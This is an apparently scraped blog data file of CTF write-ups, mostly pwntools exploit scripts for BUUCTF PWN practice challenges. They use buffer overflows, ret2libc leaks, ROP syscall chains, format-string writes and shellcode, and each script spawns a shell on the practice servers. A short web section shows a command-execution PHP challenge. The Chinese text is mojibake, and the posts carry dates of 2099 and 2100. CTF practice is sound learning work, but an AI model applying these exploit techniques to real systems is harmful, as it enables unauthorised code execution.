{"meta":{"title":"pz1o","subtitle":"pz1o","description":"CTFer,CUMT","author":"pz1o","url":"https://pz1o.top","root":"/"},"pages":[{"title":"tags","date":"2020-11-20T16:08:29.622Z","updated":"2020-11-20T16:08:29.622Z","comments":true,"path":"tags/index.html","permalink":"https://pz1o.top/tags/index.html","excerpt":"","text":""},{"title":"About","date":"2020-11-29T14:28:48.417Z","updated":"2020-11-29T14:28:48.417Z","comments":true,"path":"about/index.html","permalink":"https://pz1o.top/about/index.html","excerpt":"","text":"CUMTå¤§äºŒåœ¨è¯»ğŸ’» ä¸šä½™æ··å­ğŸ˜´â€¦ æ­£åœ¨å­¦ä¹ PWNğŸ±â€ğŸ‘¤ ddlé€‰æ‰‹ğŸ±â€ğŸ"},{"title":"categories","date":"2020-11-20T16:07:59.159Z","updated":"2020-11-20T16:07:59.159Z","comments":true,"path":"categories/index.html","permalink":"https://pz1o.top/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"BUU(PWN)","slug":"BUU-PWN","date":"2100-01-23T06:22:39.000Z","updated":"2021-02-07T07:03:52.612Z","comments":true,"path":"2100/01/23/BUU-PWN/","link":"","permalink":"https://pz1o.top/2100/01/23/BUU-PWN/","excerpt":"","text":"å¯’å‡å¼€å§‹åˆ·é¢˜ BUUï¼ˆæ ˆï¼‰warmup_csaw_2016123456789101112#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *#node3.buuoj.cn:28301r = remote(\"node3.buuoj.cn\",28301)#r = process(\"\")payload = b'A'*(0x40+0x8) + p64(0x40060d)r.sendline(payload)r.interactive() pwn1_sctf_20161234567891011#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *r = remote(\"node3.buuoj.cn\",28698)#r = process(\"./pwn1_sctf_2016\")payload = b'I'*20 + b'A'*0x4 + p32(0x08048F0D)r.sendline(payload)r.interactive() [ç¬¬å…­ç«  CTFä¹‹PWNç« ]stack1234567891011#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *r = remote(\"node3.buuoj.cn\",26846)#r = process(\"./stack\")payload = b'A'*(0xA+0x8) + p64(0x400537)r.sendline(payload)r.interactive() [ç¬¬å…­ç«  CTFä¹‹PWNç« ]ROPï¼ˆ64ä½ç³»ç»Ÿè°ƒç”¨ï¼‰64ä½çš„ç³»ç»Ÿè°ƒç”¨ &gt;&gt;&gt; 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *p&#x3D;process(&#39;.&#x2F;rop&#39;)elf&#x3D;ELF(&#39;.&#x2F;rop&#39;)libc &#x3D; elf.libcpop_rdi &#x3D; 0x4005d3puts_got &#x3D; 0x601018puts &#x3D; 0x400430main &#x3D; 0x400537rop1 &#x3D; &quot;a&quot;*18rop1 +&#x3D; p64(pop_rdi)rop1 +&#x3D; p64(puts_got)rop1 +&#x3D; p64(puts)rop1 +&#x3D; p64(main)p.sendline(rop1)p.recvuntil(&#39;\\n&#39;)addr &#x3D; u64(p.recv(6).ljust(8,&#39;\\x00&#39;))libc_base &#x3D; addr - libc.symbols[&#39;puts&#39;]info(&quot;libc:0x%x&quot;,libc_base)pop_rax &#x3D; 0x00000000000439c8 + libc_basepop_rdi &#x3D; 0x000000000002155f + libc_basepop_rsi &#x3D; 0x0000000000023e6a + libc_basepop_rdx &#x3D; 0x0000000000001b96 + libc_basesyscall &#x3D; 0x00000000000d2975 + libc_basebinsh &#x3D; next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;),) + libc_baserop2 &#x3D; &quot;a&quot;*18rop2 +&#x3D; p64(pop_rax)rop2 +&#x3D; p64(59)rop2 +&#x3D; p64(pop_rdi)rop2 +&#x3D; p64(binsh)rop2 +&#x3D; p64(pop_rsi)rop2 +&#x3D; p64(0)rop2 +&#x3D; p64(pop_rdx)rop2 +&#x3D; p64(0)rop2 +&#x3D; p64(syscall) p.recvuntil(&quot;hello\\n&quot;)p.sendline(rop2)p.interactive() ciscn_2019_n_1æµ®ç‚¹æ•°åœ¨å†…å­˜ä¸­çš„å­˜å‚¨ 12345678#include&lt;stdio.h&gt;int main()&#123; float a &#x3D; 11.28125; unsigned char* p &#x3D; (unsigned char*)&amp;a; printf(&quot;0x%x %x %x %x&quot;,*(p+3),*(p+2),*(p+1),*(p));&#125; 12345678910111213#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *#r = remote(\"\")r = remote(\"node3.buuoj.cn\",29611)payload = 'A'*(0x2c) + \"\\x00\\x80\\x34\\x41\"r.sendline(payload)r.interactive() jarvisoj_level012345678910111213#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding:utf-8 -*-from pwn import *#r &#x3D; remote(&quot;&quot;)r &#x3D; remote(&quot;node3.buuoj.cn&quot;,29477)payload &#x3D; &#39;A&#39;*(0x88) + p64(0x400596)r.sendline(payload)r.interactive() ciscn_2019_c_1ï¼ˆ64ä½çš„putsæ³„éœ²ï¼‰æœ¬åœ°å¯ä»¥æ‰“é€š 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *#r = remote(\"\")p = remote(\"node3.buuoj.cn\",29957)p = process(\"./pwn3\")elf = ELF(\"./pwn3\")libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')puts_addr = elf.symbols[\"puts\"]puts_got = elf.got[\"puts\"]encrypt = 0x4009a0pop_rdi = 0x400c83p.recvuntil(\"Input your choice!\\n\")p.sendline('1')p.recvuntil(\"Input your Plaintext to be encrypted\\n\")payload = b'A'*0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_addr)+p64(encrypt)p.sendline(payload)p.recvline()p.recvline()puts=u64(p.recv(6)+'\\x00\\x00')log.info(\"libc base 0x%x\",puts-libc.symbols['puts'])libc_base = puts-libc.symbols['puts']system_addr = libc_base + libc.symbols['system']bin_sh_addr = libc_base + next(libc.search(\"/bin/sh\"))print(next(libc.search(\"/bin/sh\")))payload2=b'A'*0x58+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)p.sendline(payload2)p.interactive() å¤ªåºŸç‰©äº† åæ¥çœ‹äº†é¢˜è§£åŸæ¥æ˜¯18ä¸Šé¢ ç”¨libcsearcher 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *from LibcSearcher import *context.os='linux'#context.log_level='debug'ru=lambda x:p.recvuntil(x)rl=lambda :p.recvline()sl=lambda x:p.sendline(x)sla=lambda x,y:p.sendlineafter(x,y)#r = remote(\"\")p = remote(\"node3.buuoj.cn\",27415)#p = process(\"./pwn3\")elf = ELF(\"./pwn3\")libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')puts_plt = elf.symbols[\"puts\"]puts_got = elf.got[\"puts\"]encrypt = 0x4009a0pop_rdi = 0x400c83ret = 0x4006b9payload = b'A'*0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)sla(\"Input your choice!\\n\",\"1\")ru(\"Input your Plaintext to be encrypted\\n\")sl(payload)rl()rl()puts = u64(ru('\\n')[:-1].ljust(8,'\\0'))libc = LibcSearcher(\"puts\",puts)print(libc)libc_base = puts-libc.dump(\"puts\")log.info(\"libc base 0x%x\",libc_base)system_addr = libc_base + libc.dump(\"system\")bin_sh_addr = libc_base + libc.dump(\"str_bin_sh\")payload2=b'A'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)sl(payload2)p.interactive() è¿™é‡Œéœ€è¦æ³¨æ„ 18çš„ubuntuæ‰§è¡Œsystemä¼šè¿›è¡Œå †æ ˆå¹³è¡¡ è§£å†³åŠæ³•æ˜¯åŠ retæŒ‡ä»¤ [OGeek2019]babyropï¼ˆ32ä½putsæ³„éœ²ï¼‰æ‰“é€š 12345678910111213141516171819202122232425262728293031323334#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding:utf-8 -*-from pwn import *context.os&#x3D;&#39;linux&#39;#context.log_level&#x3D;&#39;debug&#39;ru&#x3D;lambda x:p.recvuntil(x)rl&#x3D;lambda :p.recvline()sl&#x3D;lambda x:p.sendline(x)sla&#x3D;lambda x,y:p.sendlineafter(x,y)#r &#x3D; remote(&quot;&quot;)p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29517)#p &#x3D; process(&quot;.&#x2F;pwn&quot;)elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)payload &#x3D; b&#39;\\x00&#39;*7 + b&#39;\\xff&#39;main &#x3D; 0x8048825sl(payload)puts_plt &#x3D; elf.symbols[&#39;puts&#39;]puts_got &#x3D; elf.got[&#39;puts&#39;]payload2 &#x3D; b&#39;A&#39;*(0xe7+0x4) + p32(0x08048548) + p32(main) + p32(0x8049fd4)sla(&quot;Correct\\n&quot;,payload2)puts &#x3D; u32(p.recv(4))log.info(&quot;libc base 0x%x&quot;,puts-libc.symbols[&#39;puts&#39;])libc_base &#x3D; puts-libc.symbols[&#39;puts&#39;]system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]bin_sh_addr &#x3D; libc_base + next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))sl(payload)payload3 &#x3D; b&#39;A&#39;*(0xe7+0x4) + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)sla(&quot;Correct\\n&quot;,payload3)p.interactive() [ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼‰1234567891011121314151617181920212223#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding:utf-8 -*-from pwn import *context.os&#x3D;&#39;linux&#39;#context.log_level&#x3D;&#39;debug&#39;ru&#x3D;lambda x:p.recvuntil(x)rl&#x3D;lambda :p.recvline()sl&#x3D;lambda x:p.sendline(x)sla&#x3D;lambda x,y:p.sendlineafter(x,y)#r &#x3D; remote(&quot;&quot;)p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27812)#p &#x3D; process(&quot;.&#x2F;pwn&quot;)elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)payload &#x3D; p32(0x804C044) + &quot;aaaa%10$n&quot;sl(payload)#print(p.recv())sl(b&#39;8&#39;)p.interactive() [BJDCTF 2nd]r2t3ä¸€å¼€å§‹å‡†å¤‡\\x00å‘ç°ä¸å¯ä»¥ unsigned __int8:è¡¨ç¤ºæ— ç¬¦å·ä¸€ä¸ªå­—èŠ‚ é‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥æº¢å‡ºäº†ï¼Œå¯ä»¥çœ‹ä¸‹é¢è¿™ä¸ªeg 12345678910&gt;#include&lt;stdio.h&gt;&gt;int main()&gt;&#123; char a &#x3D; 0x100;printf(&quot;%d\\n&quot;,a-1);printf(&quot;%d\\n&quot;,a);printf(&quot;%d&quot;,a+1);&gt;&#125;&gt;è¾“å‡ºç»“æœä¸º -1 0 1 ä¸ºä»€ä¹ˆä¸­é—´æ˜¯0å‘¢ï¼Ÿ å› ä¸ºcharæ˜¯1å­—èŠ‚ï¼Œæœ€å¤§ä¸º0xffä¹Ÿå°±æ˜¯-1ï¼Œ ç»§ç»­åŠ +1ï¼Œå°±æ˜¯0x100ï¼Œå·²ç»è¶…è¿‡0xffï¼Œå°±ä¼šä¸¢å¼ƒï¼Œå˜æˆ0 12345678910111213141516171819202122232425262728293031#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding:utf-8 -*-from pwn import *context.os&#x3D;&#39;linux&#39;#context.log_level&#x3D;&#39;debug&#39;s &#x3D; lambda data :p.send(str(data))sa &#x3D; lambda delim,data :p.sendafter(str(delim), str(data))sl &#x3D; lambda data :p.sendline(str(data))sla &#x3D; lambda delim,data :p.sendlineafter(str(delim), str(data))r &#x3D; lambda num&#x3D;4096 :p.recv(num)ru &#x3D; lambda delims, drop&#x3D;True :p.recvuntil(delims, drop)itr &#x3D; lambda :p.interactive()uu32 &#x3D; lambda data :u32(data.ljust(4,&#39;\\0&#39;))uu64 &#x3D; lambda data :u64(data.ljust(8,&#39;\\0&#39;))leak &#x3D; lambda name,addr :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29806)#p &#x3D; process(&quot;.&#x2F;r2t3&quot;)elf &#x3D; ELF(&quot;.&#x2F;r2t3&quot;)libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)ret &#x3D; 0x080483bemain &#x3D; 0x804863bsystem &#x3D; 0x804858bpayload &#x3D; b&#39;A&#39;*0x15 + p32(system)payload &#x3D; payload.ljust(260,b&#39;A&#39;)sl(payload)itr() get_started_3dsctf_2016 å¥½å®¶ä¼™,è¿™é¢˜çœŸæ˜¯å¼€çœ¼äº† å…ˆè¯´ç¬¬ä¸€ç§æ–¹æ³• 12345678910111213141516171819202122232425262728293031#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding:utf-8 -*-from pwn import *context.os&#x3D;&#39;linux&#39;#context.log_level&#x3D;&#39;debug&#39;s &#x3D; lambda data :p.send(str(data))sa &#x3D; lambda delim,data :p.sendafter(str(delim), str(data))sl &#x3D; lambda data :p.sendline(str(data))sla &#x3D; lambda delim,data :p.sendlineafter(str(delim), str(data))r &#x3D; lambda num&#x3D;4096 :p.recv(num)ru &#x3D; lambda delims, drop&#x3D;True :p.recvuntil(delims, drop)itr &#x3D; lambda :p.interactive()uu32 &#x3D; lambda data :u32(data.ljust(4,&#39;\\0&#39;))uu64 &#x3D; lambda data :u64(data.ljust(8,&#39;\\0&#39;))leak &#x3D; lambda name,addr :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26722)#p &#x3D; process(&quot;.&#x2F;pwn4&quot;)elf &#x3D; ELF(&quot;.&#x2F;pwn4&quot;)libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)system &#x3D; 0x80489b8payload &#x3D; &#39;a&#39;*56payload +&#x3D; p32(0x080489A0) + p32(0x0804E6A0)payload +&#x3D; p32(0x308CD64F) + p32(0x195719D1)sleep(0.1)sl(payload)print(p.recv()) è¿™é‡Œä¸»è¦æ˜¯getsè¿™ä¸ªå‡½æ•°æ²¡æœ‰é€€å‡ºï¼Œæ‰€ä»¥éœ€è¦exitæ¥å¼ºåˆ¶é€€å‡ºï¼Œä¹‹åè¯»flagå°±è¡Œ ç¬¬äºŒä¸­ é™æ€é“¾æ¥åº”è¯¥æƒ³åˆ°ret2syscall 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *context.os='linux'#context.log_level='debug's = lambda data :p.send(str(data))sa = lambda delim,data :p.sendafter(str(delim), str(data))sl = lambda data :p.sendline(str(data))sla = lambda delim,data :p.sendlineafter(str(delim), str(data))r = lambda num=4096 :p.recv(num)ru = lambda delims, drop=True :p.recvuntil(delims, drop)itr = lambda :p.interactive()uu32 = lambda data :u32(data.ljust(4,'\\0'))uu64 = lambda data :u64(data.ljust(8,'\\0'))leak = lambda name,addr :log.success('&#123;&#125; = &#123;:#x&#125;'.format(name, addr))pop_eax_ret = 0x080b91e6pop_edx_ecx_ebx_ret = 0x0806fc30int_0x80 = 0x0806d7e5read_addr = 0x0806E140gets_addr = 0x0804F630pop_ebx_ret = 0x080481ad #0x080481ad : pop ebx ; retmain_addr = 0x08048A20bss_addr = 0x080ECD70p = remote(\"node3.buuoj.cn\",26722)p = process(\"./pwn4\")elf = ELF(\"./pwn4\")libc = ELF('./libc-2.23.so')payload = b'A'*56 + p32(gets_addr) + p32(main_addr) + p32(bss_addr)sl(payload)sl(b\"/bin/sh\")payload2 = b\"A\"*0x38 + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) +p32(bss_addr) + p32(int_0x80)sl(payload2)itr() ciscn_2019_en_2åŸé¢˜ 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *from LibcSearcher import *context.os='linux'#context.log_level='debug'ru=lambda x:p.recvuntil(x)rl=lambda :p.recvline()sl=lambda x:p.sendline(x)sla=lambda x,y:p.sendlineafter(x,y)#r = remote(\"\")p = remote(\"node3.buuoj.cn\",29937)#p = process(\"./pwn3\")elf = ELF(\"./LibC\")#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')puts_plt = elf.symbols[\"puts\"]puts_got = elf.got[\"puts\"]encrypt = 0x4009a0pop_rdi = 0x400c83ret = 0x4006b9payload = b'A'*0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)sla(\"Input your choice!\\n\",\"1\")ru(\"Input your Plaintext to be encrypted\\n\")sl(payload)rl()rl()puts = u64(ru('\\n')[:-1].ljust(8,'\\x00'))libc = LibcSearcher(\"puts\",puts)print(libc)libc_base = puts-libc.dump(\"puts\")log.info(\"libc base 0x%x\",libc_base)system_addr = libc_base + libc.dump(\"system\")bin_sh_addr = libc_base + libc.dump(\"str_bin_sh\")payload2=b'A'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)sl(payload2)p.interactive() ciscn_2019_n_8var[13] = â€˜\\x11â€™ 12345678910111213141516171819202122232425#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding:utf-8 -*-from pwn import *context.os&#x3D;&#39;linux&#39;#context.log_level&#x3D;&#39;debug&#39;s &#x3D; lambda data :p.send(str(data))sa &#x3D; lambda delim,data :p.sendafter(str(delim), str(data))sl &#x3D; lambda data :p.sendline(str(data))sla &#x3D; lambda delim,data :p.sendlineafter(str(delim), str(data))r &#x3D; lambda num&#x3D;4096 :p.recv(num)ru &#x3D; lambda delims, drop&#x3D;True :p.recvuntil(delims, drop)itr &#x3D; lambda :p.interactive()uu32 &#x3D; lambda data :u32(data.ljust(4,&#39;\\0&#39;))uu64 &#x3D; lambda data :u64(data.ljust(8,&#39;\\0&#39;))leak &#x3D; lambda name,addr :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26219)payload &#x3D; b&#39;A&#39;*(0x04*13) + p64(17)print(payload)sl(payload)itr() jarvisoj_level2sysytemå’Œ/bin/shéƒ½æœ‰ 12345678p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29272)bin_sh &#x3D; 0x0804A024elf &#x3D; ELF(&quot;.&#x2F;level2&quot;)sys &#x3D; elf.plt[&quot;system&quot;]payload &#x3D; b&#39;A&#39;*(0x88+0x4) + p32(sys) + p32(0) + p32(bin_sh)print(payload)sl(payload)itr() not_the_same_3dsctf_2016ï¼ˆ32ä½writeè°ƒç”¨ï¼‰æŠŠbssæ®µä¸Šçš„flagç›´æ¥é€šè¿‡writeå‡½æ•°æ‹¿å‡ºæ¥ 12345678p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29106)elf &#x3D; ELF(&quot;.&#x2F;pwn9&quot;)bss&#x3D;0x080eca2dpayload&#x3D;&#39;a&#39;*(0x2d)+p32(0x80489a0)+p32(elf.sym[&#39;write&#39;])+p32(0)+p32(1)+p32(bss)+p32(45)#print(payload)sl(payload)itr() [BJDCTF 2nd]one_gadgetä¸»è¦æ¥ç†Ÿæ‚‰ä¸€ä¸‹è¿™ä¸ªä¸œè¥¿ one_gadget æœ‰libcåŸºå€ç›´æ¥å°±å¯ä»¥ä¸Šone_gadget åŠŸèƒ½ï¼šæŸ¥æ‰¾å·²çŸ¥çš„libcä¸­exevce(â€œ/bin/shâ€)è¯­å¥çš„åœ°å€ç”¨æ³•: one_gadget libc-x.xx.so 1234567891011121314p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29935)elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)ru(&quot;here is the gift for u:&quot;)printf &#x3D; int(ru(&#39;\\n&#39;)[2:],16)libcbase &#x3D; printf - libc.sym[&quot;printf&quot;] one_gadget &#x3D; 0x106ef8leak(&quot;printf&quot;,libcbase)sys &#x3D; libcbase + one_gadgetpayload &#x3D; str(sys)sl(payload)itr() bjdctf_2020_babystack123456789p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27635)#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)sl(32)sys &#x3D; 0x4006E6payload &#x3D; b&#39;A&#39;*0x18 + p64(sys)sl(payload)itr() [HarekazeCTF2019]baby_rop12345678910p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29338)#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)sys &#x3D; 0x400490bin_sh &#x3D; 0x601048pop_rdi &#x3D; 0x400683payload &#x3D; b&#39;A&#39;*0x18 + p64(pop_rdi) + p64(bin_sh) + p64(sys)sl(payload)itr() jarvisoj_level2_x6412345678910p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27323)#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)sys &#x3D; 0x4004C0bin_sh &#x3D; 0x600A90pop_rdi &#x3D; 0x4006b3payload &#x3D; b&#39;A&#39;*0x88 + p64(pop_rdi) + p64(bin_sh) + p64(sys)sl(payload)itr() ciscn_2019_n_5 å†™shellcodeè¦æ³¨æ„ä¸åŒæ¶æ„ä¸‹ shellcodeæ˜¯ä¸åŒçš„ 12345678ret &#x3D; 0x4004c9bss &#x3D; 0x601080shellcode &#x3D; asm(shellcraft.sh())print(len(shellcode))sla(&quot;tell me your name\\n&quot;,shellcode)payload &#x3D; b&#39;A&#39;*0x28 + p64(bss)sla(&quot;me?\\n&quot;,payload)itr() ciscn_2019_ne_5 32ä½putsæ³„éœ² ä½†å¥½åƒputçš„gotè¡¨ä¸å¯ä»¥æ³„éœ² éœ€è¦è¯•ä¸€è¯•å…¶ä»–çš„ 123456789101112131415161718192021222324252627282930313233343536p = remote(\"node3.buuoj.cn\",29708)def add(log): ru(\"0.Exit\\n:\") sl('1') ru(\"Please input new log info:\") sl(log)def display(): ru(\"0.Exit\\n:\") sl('2')def getflag(): ru(\"0.Exit\\n:\") sl(\"4\")elf = ELF(\"./pwn14\")#libc = ELF(\"./libc-2.27.so\")sl(\"administrator\")puts_plt = elf.symbols['puts']printf_got = elf.got['printf']main = 0x8048722sys = 0x80484D0payload = b'A'*(0x48+0x4) + p32(puts_plt) + p32(main) + p32(printf_got)add(payload)getflag()ru('\\n')printf = uu32(r(4))print(printf)libc = LibcSearcher(\"printf\",printf)libc_base = printf - libc.dump(\"printf\")leak(\"printf\",libc_base)bin_sh = libc_base + libc.dump(\"str_bin_sh\")sl(\"administrator\")payload = b'A'*(0x48+0x4) + p32(sys) + p32(0xdeadbeef) + p32(bin_sh)add(payload)getflag()itr() é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop(32ä½writeæ³„éœ²)12345678910111213141516171819p = remote(\"node3.buuoj.cn\",27242)elf = ELF(\"./pwn15\")#libc = ELF(\"./libc-2.27.so\")main = 0x80484C6write_plt = elf.symbols['write']write_got = elf.got['write']payload = b'A'*(0x88+0x4) + p32(write_plt) + p32(main) + p32(0) + p32(write_got) + p32(4)sl(payload)write = uu32(r(4))libc = LibcSearcher(\"write\",write)libc_base = write - libc.dump(\"write\")leak(\"write\",libc_base)sys = libc_base + libc.dump(\"system\")bin_sh = libc_base + libc.dump(\"str_bin_sh\")payload = b'A'*(0x88+0x4) + p32(sys) + p32(0xdeadbeef) + p32(bin_sh)sl(payload)itr() bjdctf_2020_babyrop(64ä½putsæ³„éœ²)1234567891011121314151617181920p = remote(\"node3.buuoj.cn\",27648)elf = ELF(\"./pwn17\")#libc = ELF(\"./libc-2.27.so\")main = 0x4006ADpop_rdi = 0x400733puts_plt = elf.symbols['puts']puts_got = elf.got['puts']payload = b'A'*(0x20+0x8) + p64(pop_rdi) +p64(puts_got)+ p64(puts_plt) + p64(main) sla(\"Pull up your sword and tell me u story!\\n\",payload)puts = uu64(ru('\\n'))libc = LibcSearcher(\"puts\",puts)libc_base = puts - libc.dump(\"puts\")leak(\"puts\",libc_base)sys = libc_base + libc.dump(\"system\")bin_sh = libc_base + libc.dump(\"str_bin_sh\")payload = b'A'*(0x20+0x8) + p64(pop_rdi) + p64(bin_sh) + p64(sys)sl(payload)itr() others_shellcodeè¿ä¸Šå°±æœ‰ pwn2_sctf_2016ï¼ˆ32ä½printfæ³„éœ²ï¼‰ å¥½åƒprinfçš„gotè¡¨æ‰“ä¸é€š 123456789101112131415161718192021p = remote(\"node3.buuoj.cn\",28222)elf = ELF(\"./pwn19\")#libc = ELF(\"/lib32/libc.so.6\")vuln = 0x804852Fformats = 0x80486A8printf_plt = elf.sym[\"printf\"]atoi_got = elf.got[\"atoi\"]sl(-1)payload = b'A'*(0x2c+0x4) + p32(printf_plt) + p32(vuln) + p32(atoi_got)sl(payload)ru('\\n')ru('\\n')atoi = uu32(r(4))libc = LibcSearcher(\"atoi\",atoi)libc_base = atoi - libc.dump('atoi')sys = libc_base + libc.dump('system')bin_sh = libc_base + libc.dump('str_bin_sh')payload = b'A'*(0x2c+0x4) + p32(sys) +p32(0xdeadbeef) + p32(bin_sh)sl(-1)sl(payload)itr() [HarekazeCTF2019]baby_rop2(64ä½printfæ³„éœ²) ç»å¸¸ä¼šå‡ºç°æ³„éœ²printfçš„gotè¡¨ä¸è¡Œçš„æƒ…å†µ å°½é‡ç”¨å…¶ä»–çš„ 1234567891011121314151617181920p = remote(\"node3.buuoj.cn\",28714)elf = ELF(\"./pwn21\")#libc = ELF(\"./libc-2.27.so\")vuln = 0x400636pop_rdi = 0x400733ret = 0x4004d1printf_plt = elf.sym[\"printf\"]read_got = elf.got[\"read\"]payload = b'A'*(0x20+0x8) + p64(pop_rdi) + p64(read_got) + p64(printf_plt) + p64(vuln) sl(payload)ru('\\n')read = uu64(ru(\"What's\"))libc = LibcSearcher(\"read\",read)libc_base = read - libc.dump('read')sys = libc_base + libc.dump('system')bin_sh = libc_base + libc.dump('str_bin_sh')payload = b'A'*(0x20+0x8) + p64(pop_rdi) + p64(bin_sh) + p64(sys)sl(payload)itr() ez_pz_hackover_201612345678910p = remote(\"node3.buuoj.cn\",28640)elf = ELF(\"./pwn22\")ru(\"Yippie, lets crash: \")stack = int(ru('\\n'),16)#print(stack)#libc = ELF(\"./libc-2.27.so\")shellcode = asm(shellcraft.sh())payload = \"crashme\\x00\" + b'A'*(0x16-8+4) + p32(stack-0x1c) + shellcodesl(payload)itr()","categories":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"}]},{"title":"å¤ç°wp","slug":"å¤ç°wp","date":"2099-09-28T02:18:17.000Z","updated":"2020-11-20T14:19:52.357Z","comments":true,"path":"2099/09/28/å¤ç°wp/","link":"","permalink":"https://pz1o.top/2099/09/28/%E5%A4%8D%E7%8E%B0wp/","excerpt":"","text":"Hitcon2017 babyfirst-revenggithubå¤ç°åœ°å€ https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge è€ƒç‚¹å‘½ä»¤æ‰§è¡Œæ„é€ åå¼¹shell æºç å¦‚ä¸‹ï¼š 12345678910&lt;?php $sandbox = '/www/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) &#123; @exec($_GET['cmd']); &#125; else if (isset($_GET['reset'])) &#123; @exec('/bin/rm -rf ' . $sandbox); &#125; highlight_file(__FILE__); å…ˆè¯´å‡ ä¸ªçŸ¥è¯†ç‚¹ï¼š 1234&gt;e\\&gt;cho\\&#39;123&#39;&gt;123 åœ¨linuxä¸­æ¢è¡Œå¯ä»¥æ‰§è¡Œé—´æ–­çš„å‘½ä»¤ 1234567&gt;root@kali:~# vi 1 //åœ¨1ä¸‹å†™å…¥cat flag.txt&gt;root@kali:~# touch flag.txt&gt;root@kali:~# echo \"cumtctf&#123;i_am_so_cute&#125;\" &gt;&gt; flag.txt&gt;root@kali:~# cat flag.txt&gt;cumtctf&#123;i_am_so_cute&#125;&gt;root@kali:~# sh 1&gt;cumtctf&#123;i_am_so_cute&#125; åœ¨Linuxä¸‹é¢å¯ä»¥é€šè¿‡å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œé¢çš„å†…å®¹æ˜¯ç³»ç»Ÿå‘½ä»¤ï¼Œç„¶åå¯ä»¥é€šè¿‡sh filenameæ¥æ‰§è¡Œæ–‡æœ¬é‡Œé¢çš„ç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚æœæœ‰æŠ¥é”™çš„è¯ä¼šè‡ªåŠ¨è·³è¿‡ CUMTCTF2020Webç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿè€ƒç‚¹require_onceç»•è¿‡ æºç å¦‚ä¸‹ 1234567891011&lt;?phpif ($_SERVER['HTTP_CLIENT_IP'] != '127.0.0.1' &amp;&amp; $_SERVER['HTTP_X_REAL_IP'] != '127.0.0.1')&#123; if ($_SERVER['HTTP_X_FORWARDED_FOR'] == \"127.0.0.1\") &#123; die(\"Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple 